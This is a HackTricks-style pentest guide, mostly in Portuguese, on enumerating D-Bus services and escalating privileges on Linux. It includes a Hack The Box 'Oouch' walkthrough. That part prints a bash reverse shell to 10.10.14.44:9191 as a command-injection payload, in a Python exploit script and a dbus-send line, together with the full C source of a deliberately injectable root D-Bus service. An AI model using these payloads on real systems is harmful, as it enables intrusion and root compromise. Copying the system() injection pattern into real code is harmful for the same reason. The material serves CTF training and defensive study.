# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus é utilizado como o mediador de comunicações entre processos (IPC) em ambientes de desktop do Ubuntu. No Ubuntu, observa-se a operação simultânea de vários message buses: o system bus, utilizado principalmente por **serviços privilegiados para expor serviços relevantes em todo o sistema**, e um session bus para cada usuário autenticado, expondo serviços relevantes apenas para esse usuário específico. O foco aqui está principalmente no system bus devido à sua associação com serviços executados com privilégios mais altos (por exemplo, root), já que nosso objetivo é elevar privilégios. Observa-se que a arquitetura do D-Bus emprega um 'router' por session bus, responsável por redirecionar as mensagens do cliente para os serviços apropriados com base no endereço especificado pelos clientes para o serviço com o qual desejam se comunicar.

Os serviços no D-Bus são definidos pelos **objects** e **interfaces** que expõem. Os objects podem ser comparados a instâncias de classe em linguagens OOP padrão, com cada instância sendo identificada de forma única por um **object path**. Esse path, semelhante a um filesystem path, identifica de forma única cada object exposto pelo serviço. Uma interface importante para fins de pesquisa é a interface **org.freedesktop.DBus.Introspectable**, que possui um único método, Introspect. Esse método retorna uma representação XML dos métodos, signals e properties suportados pelo object, com foco aqui nos methods, omitindo properties e signals.

Para a comunicação com a interface D-Bus, foram utilizadas duas ferramentas: uma ferramenta CLI chamada **gdbus** para invocação fácil de methods expostos pelo D-Bus em scripts, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uma ferramenta GUI baseada em Python projetada para enumerar os services disponíveis em cada bus e exibir os objects contidos em cada service.
```bash
sudo apt-get install d-feet
```
Se você estiver verificando a **session bus**, confirme primeiro o endereço atual:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Na primeira imagem, são mostrados os serviços registrados com o D-Bus system bus, com **org.debin.apt** destacado especificamente após selecionar o botão System Bus. O D-Feet consulta esse serviço por objetos, exibindo interfaces, métodos, propriedades e signals para os objetos escolhidos, como visto na segunda imagem. A assinatura de cada method também é detalhada.

Uma característica notável é a exibição do **process ID (pid)** e da **command line** do serviço, útil para confirmar se o serviço executa com privilégios elevados, importante para a relevância da pesquisa.

**O D-Feet também permite a invocação de métodos**: os usuários podem inserir expressões Python como parâmetros, que o D-Feet converte para tipos D-Bus antes de passá-las ao serviço.

No entanto, note que **alguns métodos exigem authentication** antes de nos permitir invocá-los. Vamos ignorar esses métodos, já que nosso objetivo é elevar nossos privilégios sem credenciais desde o início.

Observe também que alguns dos serviços consultam outro serviço D-Bus chamado org.freedeskto.PolicyKit1 para verificar se um usuário deve ou não ser autorizado a executar certas actions.

## **Cmd line Enumeration**

### List Service Objects

É possível listar interfaces D-Bus abertas com:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Serviços marcados como **`(activatable)`** são especialmente interessantes porque **ainda não estão em execução**, mas uma solicitação ao bus pode iniciá-los sob demanda. Não pare em `busctl list`; mapeie esses nomes para os binários reais que eles executariam.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Isso informa rapidamente qual caminho `Exec=` será iniciado para um nome ativável e sob qual identidade. Se o binário ou sua cadeia de execução estiverem fracamente protegidos, um serviço inativo ainda pode se tornar um caminho de privilege-escalation.

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Quando um processo configura uma conexão a um bus, o bus atribui à conexão um nome especial de bus chamado _unique connection name_. Os nomes de bus desse tipo são imutáveis — é garantido que não mudarão enquanto a conexão existir — e, mais importante, não podem ser reutilizados durante o tempo de vida do bus. Isso significa que nenhuma outra conexão a esse bus jamais terá atribuído um nome único assim, mesmo que o mesmo processo feche a conexão ao bus e crie uma nova. Os unique connection names são facilmente reconhecíveis porque começam com o caractere de dois-pontos — caso contrário proibido.

### Service Object Info

Então, você pode obter algumas informações sobre a interface com:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Também correlacione o nome do bus com sua unidade `systemd` e caminho do executável:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Isto responde à questão operacional que importa durante privesc: **se uma chamada de método for bem-sucedida, qual binary e unit reais executarão a ação?**

### List Interfaces of a Service Object

Você precisa ter permissões suficientes.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Inspecionar a Interface de um Objeto de Serviço

Note como, neste exemplo, foi selecionada a interface mais recente descoberta usando o parâmetro `tree` (_veja a seção anterior_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Note o método `.Block` da interface `htb.oouch.Block` (o que nos interessa). O "s" das outras colunas pode significar que ele está esperando uma string.

Antes de tentar qualquer coisa perigosa, valide primeiro um método **read-oriented** ou de baixo risco. Isso separa claramente três casos: sintaxe errada, acessível mas negado, ou acessível e permitido.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Correlate D-Bus Methods with Policies and Actions

Introspection tells you **what** you can call, but it does not tell you **why** a call is allowed or denied. For real privesc triage you usually need to inspect **three layers together**:

1. **Activation metadata** (`.service` files or `SystemdService=`) para descobrir qual binary e unit realmente serão executados.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) para descobrir quem pode `own`, `send_destination`, or `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) para descobrir o modelo de autorização padrão (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Não **assuma** um mapeamento 1:1 entre um método D-Bus e uma ação Polkit. O mesmo método pode escolher uma ação diferente dependendo do objeto sendo modificado ou do contexto em tempo de execução. Portanto, o fluxo de trabalho prático é:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` e grep nos arquivos `.policy` relevantes
3. sondas ao vivo de baixo risco com `busctl call`, `gdbus call`, ou `dbusmap --enable-probes --null-agent`

Serviços proxy ou de compatibilidade merecem atenção extra. Um **proxy executado como root** que encaminha requests para outro serviço D-Bus por meio de sua própria conexão pré-estabelecida pode, acidentalmente, fazer o backend tratar cada request como se viesse de UID 0, a menos que a identidade do chamador original seja revalidada.

### Monitor/Capture Interface

Com privilégios suficientes (apenas `send_destination` e `receive_sender` não são suficientes) você pode **monitorar uma comunicação D-Bus**.

Para **monitorar** uma **comunicação** você precisará ser **root.** Se ainda encontrar problemas sendo root, veja [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) e [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Se você souber como configurar um arquivo de config do D-Bus para **permitir que usuários não root farejem** a comunicação, por favor **entre em contato comigo**!

Diferentes formas de monitorar:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
No exemplo a seguir, a interface `htb.oouch.Block` é monitorada e **a mensagem "**_**lalalalal**_**" é enviada por falha de comunicação**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Você pode usar `capture` em vez de `monitor` para salvar os resultados em um arquivo **pcapng** que o Wireshark pode abrir:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtrando todo o ruído <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Se houver informação demais no bus, passe uma regra de correspondência assim:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Podem ser especificadas várias regras. Se uma mensagem corresponder a _qualquer_ uma das regras, a mensagem será impressa. Como assim:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Veja a [documentação do D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) para mais informações sobre a sintaxe de match rule.

### More

`busctl` tem ainda mais opções, [**encontre todas elas aqui**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

Como usuário **qtc dentro do host "oouch" da HTB**, você pode encontrar um **arquivo de configuração D-Bus inesperado** localizado em _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Note da configuração anterior que **você precisará ser o usuário `root` ou `www-data` para enviar e receber informações** via esta comunicação D-BUS.

Como usuário **qtc** dentro do container Docker **aeb4525789d8**, você pode encontrar algum código relacionado ao dbus no arquivo _/code/oouch/routes.py._ Este é o código interessante:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Como você pode ver, ele está **se conectando a uma interface D-Bus** e enviando para a função **"Block"** o "client_ip".

Do outro lado da conexão D-Bus há algum binário compilado em C em execução. Esse código está **escutando** na conexão D-Bus **o endereço IP e chamando iptables via a função `system`** para bloquear o endereço IP fornecido.\
**A chamada para `system` é vulnerável de propósito a command injection**, então um payload como o seguinte criará uma reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

No final desta página você pode encontrar o **código C completo da aplicação D-Bus**. Dentro dele você pode encontrar entre as linhas 91-97 **como o `D-Bus object path`** **e o `interface name`** são **registrados**. Essa informação será necessária para enviar informações para a conexão D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Também, na linha 57 você pode encontrar que **o único método registrado** para esta comunicação D-Bus se chama `Block`(_**É por isso que na seção seguinte os payloads serão enviados para o objeto de serviço `htb.oouch.Block`, a interface `/htb/oouch/Block` e o nome do método `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

O seguinte código python enviará o payload para a conexão D-Bus ao método `Block` via `block_iface.Block(runme)` (_note que ele foi extraído do trecho de código anterior_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl e dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` é uma ferramenta usada para enviar mensagens ao “Message Bus”
- Message Bus – Um software usado por sistemas para facilitar a comunicação entre aplicações. Está relacionado ao Message Queue (as mensagens são ordenadas em sequência), mas no Message Bus as mensagens são enviadas em um modelo de assinatura e também são muito rápidas.
- A tag “-system” é usada para indicar que é uma mensagem do sistema, não uma message de sessão (por padrão).
- A tag “–print-reply” é usada para imprimir nossa mensagem apropriadamente e receber quaisquer replies em um formato legível por humanos.
- “–dest=Dbus-Interface-Block” O endereço da interface Dbus.
- “–string:” – Tipo de mensagem que queremos enviar para a interface. Existem vários formatos de envio de mensagens, como double, bytes, booleans, int, objpath. Dentre eles, o “object path” é útil quando queremos enviar um path de um arquivo para a interface Dbus. Podemos usar um arquivo especial (FIFO) nesse caso para passar um comando para a interface no nome de um arquivo. “string:;” – Isso é para chamar o object path novamente, onde colocamos o arquivo/comando de reverse shell FIFO.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Helpers de Enumeration Automatizada (2023-2025)

A enumeração manual de uma grande attack surface de D-Bus com `busctl`/`gdbus` rapidamente fica dolorosa. Duas pequenas utilitários FOSS lançados nos últimos anos podem acelerar isso durante engagements de red-team ou CTF:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Escrito em C; binary estático único (<50 kB) que percorre cada object path, obtém o XML `Introspect` e o mapeia para o PID/UID dono.
* Flags úteis:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* A tool marca nomes well-known desprotegidos com `!`, revelando instantaneamente serviços que você pode *own* (take over) ou chamadas de método que são alcançáveis a partir de uma shell sem privilégios.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Script apenas em Python que procura paths *writable* em unidades do systemd **e** arquivos de policy de D-Bus permissivos demais (por exemplo, `send_destination="*"`).
* Uso rápido:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* O módulo de D-Bus pesquisa os diretórios abaixo e destaca qualquer serviço que possa ser spoofed ou hijacked por um usuário normal:
* `/etc/dbus-1/system.d/` e `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

Ficar de olho em CVEs publicados recentemente ajuda a identificar padrões inseguros semelhantes em código customizado. Dois bons exemplos recentes são:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | O serviço executando como root expunha uma interface D-Bus que usuários sem privilégios podiam reconfigurar, incluindo carregar comportamento de macro controlado pelo atacante. | Se um daemon expõe **device/profile/config management** no system bus, trate configuração gravável e features de macro como primitivas de execução de código, não apenas "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Um proxy de compatibilidade executando como root repassava requests para serviços backend sem preservar o security context original do chamador, então os backends confiavam no proxy como UID 0. | Trate serviços D-Bus de **proxy / bridge / compatibility** como uma classe de bug separada: se eles encaminham chamadas privilegiadas, verifique como o UID do chamador / contexto Polkit chega ao backend. |

Padrões a notar:
1. O serviço roda **como root no system bus**.
2. Ou não há **authorization check**, ou o check é feito contra o **subject errado**.
3. A method acessível eventualmente altera o estado do sistema: instalação de pacotes, mudanças de usuário/grupo, configuração do bootloader, updates de perfil de dispositivo, writes de arquivos ou execução direta de comandos.

Use `dbusmap --enable-probes` ou `busctl call` manual para confirmar se uma method é acessível, depois inspecione a policy XML do serviço e as actions do Polkit para entender **qual subject** está realmente sendo autorizado.

---

## Hardening & Detection Quick-Wins

* Procure por policies world-writable ou *send/receive*-open:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Exija Polkit para methods perigosos – até proxies *root* devem passar o *caller* PID para `polkit_authority_check_authorization_sync()` em vez do próprio.
* Remova privilégios em helpers de longa duração (use `sd_pid_get_owner_uid()` para trocar namespaces após conectar ao bus).
* Se você não puder remover um serviço, pelo menos *scope* ele para um grupo Unix dedicado e restrinja o acesso em sua policy XML.
* Blue-team: capture o system bus com `busctl capture > /var/log/dbus_$(date +%F).pcapng` e importe-o para o Wireshark para anomaly detection.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
